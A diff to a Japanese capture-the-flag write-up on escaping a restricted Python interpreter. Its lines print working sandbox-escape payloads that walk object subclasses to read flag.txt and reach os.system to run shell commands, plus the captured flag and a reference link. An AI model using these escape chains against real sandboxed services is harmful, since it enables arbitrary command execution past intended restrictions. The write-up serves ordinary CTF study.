@@ -13,7 +13,7 @@ linux問でもこういう入力が制限された問題だったので、linux 
 __builtin__のメソッドを中心に調査し、flag.txtのreadを実行すると、ソースコードを読めと返ってきました。そこで、lsを実行すると`jail.py`というファイルが確認できました。あとは同様にreadすればフラグが読めました。
 
 
-```bash
+```python
  print  ().__class__.__bases__[0].__subclasses__()[40]('./flag.txt').read()
 The flag is in the source code.
 >>> print ().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
@@ -83,3 +83,7 @@ while 1:
 ```bash
 OFPPT-CTF{py7h0n_br34k_1s_l1k3_pr1s0n_br34k_sh0w}
 ```
+
+## 参考
+
+- https://ctf-wiki.mahaloz.re/pwn/linux/sandbox/python-sandbox-escape/
